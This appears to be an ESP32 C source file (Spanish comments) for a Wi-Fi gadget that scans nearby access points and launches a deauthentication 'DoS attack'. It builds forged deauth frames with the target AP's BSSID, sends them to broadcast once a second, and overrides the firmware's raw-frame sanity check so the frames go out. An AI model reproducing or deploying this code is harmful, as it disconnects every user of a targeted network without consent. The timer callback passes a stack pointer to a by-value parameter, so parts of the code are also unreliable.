#include "wifi_controller.h"
#include "icons.h"
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include "ataques_wifi.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "globals.h"
#include "nvs_flash.h"
#include "esp_timer.h"

static const char *TAG = "main:attack_dos";
static bool wifi_iniciado = false;
static int wifi_mode = -1;
static esp_timer_handle_t deauth_timer_handle;

static const uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3) { 
    return 0;
}

void attack_dos_start(wifi_ap_record_t ap_record) {
    ESP_LOGI(TAG, "Starting DoS attack...");

    iniciar_wifi(TAG, WIFI_MODE_AP);
    const esp_timer_create_args_t deauth_timer_args = {
	.callback = &send_deauth_frame,
	.arg = (void *)&ap_record
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 1000000));
}

void attack_dos_stop() {
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
    ESP_LOGI(TAG, "DoS attack stopped");
}

void basta_wifi() {
    if (!wifi_iniciado) return;
    wifi_iniciado = false;
    esp_wifi_stop();
    esp_wifi_deinit();
    ESP_ERROR_CHECK(esp_event_loop_delete_default());   
}

int iniciar_wifi_modo_sta() {
    esp_err_t ret = esp_wifi_set_mode(WIFI_MODE_STA);
    if (ret != ESP_OK) {
        ESP_LOGE("wifi_init:STA", "Error fijando el modo Wi-Fi: %s", esp_err_to_name(ret));
        return -1;
    }
    return 0;
}

int iniciar_wifi_modo_ap() {
    esp_netif_create_default_wifi_ap();
    esp_err_t ret = esp_wifi_set_mode(WIFI_MODE_AP);
    if (ret != ESP_OK) {
        ESP_LOGE("wifi_init:AP", "Error fijando el modo Wi-Fi: %s", esp_err_to_name(ret));
        return -1;
    }
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "esp32_dummyap",
            .ssid_len = 0,
            .password = "dummypassword",
            .channel = 0,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .ssid_hidden = 1,
            .max_connection = 4,
            .beacon_interval = 60000
        }
    };
    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ret != ESP_OK) {
        ESP_LOGE("wifi_init:AP", "Error fijando la configuración para el modo AP: %s", esp_err_to_name(ret));
        return -1;
    }
    return 0;
}

int iniciar_wifi(const char *TAG, int mode) {
    if (wifi_iniciado) return 0;
    wifi_mode = mode;
    wifi_iniciado = true;
    int rval = -1;
    esp_err_t ret;
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    // Inicializar NVS
    ESP_LOGI(TAG, "Inicializando NVS...");
    ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error inicializando NVS: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Init NVS!", true);
        goto error;
    }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error inicializando Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Init Wi-Fi!", true);
        goto error;
    }
    int err = -1;
    if (mode == WIFI_MODE_AP) {
        err = iniciar_wifi_modo_ap();
    }
    else if (mode == WIFI_MODE_STA) {
        err = iniciar_wifi_modo_sta();
    }
    if (err == -1) {
        mostrar_mensaje("Error Modo Wi-Fi!", true);
        goto error;
    }

    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error iniciando Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Start Wi-Fi!", true);
        goto error;
    }
    rval = 0;
    return rval;
error:
    basta_wifi();
    return rval;
}


bool esta_wifi() {
    return wifi_iniciado;
}

void send_deauth_frame(const wifi_ap_record_t ap_record) {
    uint8_t deauth_frame[sizeof(deauth_frame_template)];
    
    memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame));
    memcpy(deauth_frame+10, ap_record.bssid, 6);
    memcpy(deauth_frame+16, ap_record.bssid, 6);

    ESP_LOGI(TAG, "Sending deauth frame...");
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false));
}

const wifictl_ap_records_t *get_aps() {
    const wifictl_ap_records_t *aps; 
    static const char *TAG = "WIFI_SCAN";
    if (iniciar_wifi(TAG, WIFI_MODE_STA) == -1) {
        return NULL;
    }
    wifictl_scan_nearby_aps();
    aps = wifictl_get_ap_records();
    basta_wifi();
    return aps;
}

const char *rssi_to_icon(int8_t rssi) {
    if (rssi >=  -70) return &wifi_bitmap_4;
    if (rssi >=  -85) return &wifi_bitmap_3;
    if (rssi >= -100) return &wifi_bitmap_2;
    if (rssi >= -128) return &wifi_bitmap_1;
    return &wifi_bitmap_0;
}
